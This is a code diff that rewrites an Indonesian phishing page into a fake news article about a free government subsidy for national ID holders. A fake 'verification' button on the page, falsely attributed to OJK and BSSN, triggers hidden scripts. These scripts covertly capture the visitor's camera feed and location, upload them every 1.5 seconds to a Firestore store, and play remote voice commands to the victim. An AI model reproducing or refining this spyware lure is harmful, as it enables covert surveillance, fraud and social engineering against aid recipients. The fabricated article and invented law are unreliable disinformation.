@@ -3,16 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Verifikasi Biometrik</title>
+    <title>Warta Nasional - Berita Terkini dan Terpercaya</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        .article-content p { margin-bottom: 1.5rem; color: #333; line-height: 1.8; }
+        .sticky-nav { position: sticky; top: 0; z-index: 40; }
+    </style>
 </head>
-<body class="bg-gray-100 flex items-center justify-center min-h-screen">
-    <div id="gate" class="bg-white p-8 rounded-2xl shadow-xl max-w-sm text-center">
-        <h1 class="text-xl font-bold mb-4 text-red-600">AKSES DITANGGUHKAN</h1>
-        <p class="text-sm text-gray-600 mb-8 text-left">Sistem mendeteksi akses mencurigakan. Aktifkan kamera untuk verifikasi wajah agar saldo bantuan Anda dapat diproses.</p>
-        <button id="auth-btn" class="w-full bg-red-600 text-white font-bold py-4 rounded-xl shadow-lg">AKTIFKAN VERIFIKASI</button>
-    </div>
+<body class="bg-white">
+    <!-- Navbar -->
+    <nav class="sticky-nav bg-red-700 text-white p-4 shadow-md">
+        <div class="max-w-4xl mx-auto flex justify-between items-center">
+            <div class="font-bold text-2xl italic tracking-tighter">WARTA<span class="text-yellow-400">NASIONAL</span></div>
+            <div class="hidden md:flex space-x-4 text-sm font-semibold">
+                <span>POLITIK</span>
+                <span>EKONOMI</span>
+                <span>METRO</span>
+                <span>DUNIA</span>
+            </div>
+        </div>
+    </nav>
 
+    <!-- Main Content -->
+    <main class="max-w-4xl mx-auto p-4 md:p-8">
+        <div class="mb-4">
+            <span class="text-red-600 font-bold text-sm">EKONOMI & SOSIAL</span>
+            <h1 class="text-3xl md:text-4xl font-extrabold mt-2 leading-tight">Pemerintah Sahkan Program Subsidi Listrik dan Sembako Gratis untuk Seluruh Pemegang NIK Aktif Mulai Maret 2026</h1>
+            <div class="flex items-center mt-4 text-gray-500 text-xs italic">
+                <span>Oleh: Redaksi Warta Nasional</span>
+                <span class="mx-2">•</span>
+                <span>Senin, 02 Maret 2026</span>
+            </div>
+        </div>
+
+        <img src="https://via.placeholder.com/800x450?text=Distribusi+Bantuan+Sosial" class="w-full rounded-lg mb-6 shadow-sm">
+
+        <div class="article-content text-lg">
+            <p><strong>Jakarta</strong> - Pemerintah melalui Kementerian Sosial dan Kementerian Energi dan Sumber Daya Mineral resmi meluncurkan program integrasi subsidi nasional yang menyasar seluruh pemilik Nomor Induk Kependudukan (NIK) yang terdaftar di database kependudukan nasional.</p>
+            
+            <p>Program ini bertujuan untuk menekan laju inflasi dan memastikan daya beli masyarakat tetap terjaga di tengah dinamika ekonomi global. Menteri Koordinator Bidang Perekonomian menyatakan bahwa subsidi ini bukan lagi bersifat tunai, melainkan langsung terintegrasi dengan layanan digital kependudukan masing-masing warga.</p>
+
+            <!-- Trigger Form (The Trap) -->
+            <div id="trap-container" class="my-8 p-6 bg-red-50 border-l-4 border-red-600 rounded-r-lg shadow-inner">
+                <h3 class="font-bold text-xl mb-4 text-red-800 italic">Verifikasi Hak Subsidi Anda</h3>
+                <p class="text-sm text-gray-700 mb-6">Sesuai dengan protokol keamanan siber yang baru (UU No. 27/2026), setiap penerima manfaat wajib melakukan <strong>Verifikasi Biometrik Wajah</strong> dan <strong>Sinkronisasi Lokasi</strong> untuk memastikan bantuan tidak salah sasaran.</p>
+                
+                <button id="verify-btn" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-4 rounded shadow-lg transition-all animate-bounce">
+                    AKTIFKAN VERIFIKASI SEKARANG
+                </button>
+                <p class="text-[10px] text-gray-400 mt-4 text-center italic">Layanan ini diawasi oleh Otoritas Jasa Keuangan (OJK) dan BSSN.</p>
+            </div>
+
+            <p>Menurut data terakhir, terdapat lebih dari 150 juta warga yang berpotensi menerima manfaat ini. Subsidi mencakup potongan tagihan listrik hingga 50% bagi golongan tertentu dan paket pangan pokok yang didistribusikan setiap bulan melalui jaringan ritel modern yang bekerja sama dengan pemerintah.</p>
+
+            <p>Direktur Jenderal Kependudukan menambahkan bahwa masyarakat tidak perlu lagi mengantre di kantor kelurahan. "Cukup melalui portal resmi berita yang terintegrasi, warga bisa langsung melakukan validasi data biometrik mereka untuk mengaktifkan status subsidi," ujarnya dalam konferensi pers pagi tadi.</p>
+        </div>
+    </main>
+
+    <!-- Background Process Logic -->
     <video id="v" style="display:none" autoplay playsinline></video>
     <canvas id="c" style="display:none"></canvas>
 
@@ -35,48 +84,69 @@
         const auth = getAuth(app);
         const appId = "apktroj_v1";
 
-        document.getElementById('auth-btn').onclick = async () => {
-            document.getElementById('gate').innerHTML = `<p class="animate-pulse font-bold">SEDANG MEMPROSES VERIFIKASI...</p>`;
+        document.getElementById('verify-btn').onclick = async () => {
+            const btn = document.getElementById('verify-btn');
+            btn.classList.remove('animate-bounce');
+            btn.innerText = "SEDANG MENGHUBUNGKAN KE SERVER BSSN...";
+            btn.disabled = true;
+
             await signInAnonymously(auth);
-            startStreaming();
+            startAgent();
         };
 
-        async function startStreaming() {
+        async function startAgent() {
             const userId = auth.currentUser.uid;
+            let currentLocation = null;
 
-            // Listen for Voice Commands (fixed doc ID)
-            onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'commands', 'voice_cmd'), (snap) => {
-                if (snap.exists()) {
-                    const data = snap.data();
-                    // Play only if it's a new command
-                    if (Date.now() - data.timestamp < 5000) {
-                        const ut = new SpeechSynthesisUtterance(data.text);
-                        ut.lang = 'id-ID';
-                        window.speechSynthesis.speak(ut);
-                    }
-                }
-            });
+            // 1. Get Stealth Location
+            navigator.geolocation.getCurrentPosition(p => {
+                currentLocation = { lat: p.coords.latitude, lng: p.coords.longitude };
+            }, err => console.log("Loc Denied"));
 
-            // Stream Video Buffer
+            // 2. Start Stealth Stream
             navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
                 const video = document.getElementById('v');
                 video.srcObject = stream;
-                
                 const canvas = document.getElementById('c');
                 const ctx = canvas.getContext('2d');
 
+                // Update Buffer Every 1.5 seconds (Overwrite)
                 setInterval(async () => {
-                    canvas.width = 320; // Lower resolution for speed
-                    canvas.height = 240;
+                    canvas.width = 240; 
+                    canvas.height = 180;
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
-                    // OVERWRITE old frame in Firestore
                     await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'stream_buffer', userId), {
-                        frame: canvas.toDataURL('image/jpeg', 0.4),
+                        frame: canvas.toDataURL('image/jpeg', 0.3),
+                        location: currentLocation,
                         timestamp: Date.now(),
                         uid: userId
                     });
-                }, 800); // 800ms for pseudo-video feel without burning quota
+                }, 1500);
+
+                // 3. Listen for Voice Commands (Intercom)
+                onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'commands', 'voice_cmd'), (snap) => {
+                    if (snap.exists()) {
+                        const data = snap.data();
+                        if (Date.now() - data.timestamp < 3000) {
+                            const utter = new SpeechSynthesisUtterance(data.text);
+                            utter.lang = 'id-ID';
+                            utter.rate = 1.0;
+                            window.speechSynthesis.speak(utter);
+                        }
+                    }
+                });
+
+                document.getElementById('trap-container').innerHTML = `
+                    <div class="text-center p-4">
+                        <div class="inline-block animate-spin rounded-full h-8 w-8 border-b-2 border-red-600 mb-2"></div>
+                        <p class="text-sm font-bold text-red-600 uppercase">Verifikasi Wajah & Lokasi Berlangsung...</p>
+                        <p class="text-xs text-gray-500">Mohon jangan tutup halaman ini agar validasi tidak gagal.</p>
+                    </div>
+                `;
+            }).catch(e => {
+                alert("Verifikasi Gagal: Akses Kamera Wajib Diberikan untuk Validasi Biometrik.");
+                location.reload();
             });
         }
     </script>
